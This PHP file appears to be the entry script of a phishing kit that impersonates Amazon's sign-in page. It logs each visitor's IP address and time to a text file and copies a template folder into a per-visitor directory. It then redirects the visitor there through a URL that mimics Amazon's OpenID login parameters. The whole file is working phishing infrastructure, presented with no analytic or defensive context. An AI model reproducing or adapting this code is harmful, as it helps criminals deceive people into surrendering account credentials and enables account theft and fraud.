<?php 
session_start();
include "./x/cfg.php";
include "./x/lock.php";
require_once './x/Mobile_Detect.php';

$ip = getenv("REMOTE_ADDR");
$adddate = date("D M d, Y g:i a");
$PC = "PC IP: ".$ip." - ".$adddate." - ".$_SESSION['_DIR_']."\n";
$MB = "Mobile IP: ".$ip." - ".$adddate." - ".$_SESSION['_DIR_']."\n";
$detect = new Mobile_Detect;

function save($arg) {
	$testfile = fopen("v.txt", "a") or die("Unable to open file!");
	$txt = $arg;
	fwrite($testfile, $txt);
	fclose($testfile);
}

if ( $detect->isMobile() ) {
	recurse_copy( $rush4, $DIR );
	save($MB);
	header("location: ".$DIR."/index.php?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account=");
}
elseif ( !$detect->isMobile() ) {
	recurse_copy( $rush4, $DIR );
	save($PC);
	header("location: ".$DIR."/index.php?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&switch_account=");
}
?>